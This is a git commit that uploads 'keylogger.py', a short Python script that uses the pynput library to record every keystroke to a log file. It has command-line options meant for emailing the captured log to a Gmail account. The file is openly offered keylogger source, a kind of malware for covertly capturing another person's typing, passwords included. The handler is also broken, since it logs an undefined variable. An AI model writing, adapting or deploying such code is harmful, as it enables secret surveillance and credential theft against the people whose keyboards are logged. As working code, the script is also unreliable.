b3ab9beef600b5703d21c471c179cbaed9032f44
Larry1011x <60589853+Larry1011x@users.noreply.github.com>
2021-04-20 00:46:38 -0400

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,52 @@
+import argparse
+import os
+import sys
+from pynput.keyboard import Key, Listener
+import logging
+
+my_parser = argparse.ArgumentParser(prog='keylogger',
+                                    usage='%(prog)s [options] -f ',
+                                    description="A keylogger to capture the keystrokes of a user.",
+                                    prefix_chars='/')
+
+my_parser.add_argument('f',
+                        metavar='file',
+                        type=str,
+                        help='specify the name of the file, by default: keys.txt',
+                        default='keys.txt')
+
+my_parser.add_argument('dir',
+                        metavar='dir',
+                        type=str,
+                        help='specify the name of the directory to save the file in, by default: current directory',
+                        default='')
+
+
+my_parser.add_argument('m',
+                        action='store_true',
+                        help='set flag to allow email.')
+
+my_parser.add_argument('e',
+                        metavar='email',
+                        type=str,
+                        help='specify email to send file to, only works with gmail right now.')
+
+my_parser.add_argument('p',
+                        metavar='password',
+                        type=str,
+                        help='specify password to use with email service.')
+
+args = my_parser.parse_args()
+
+
+logging.basicConfig(filename=(args.dir + args.f), \
+    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(args):
+    logging.info(str(key))
+    
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+    
+
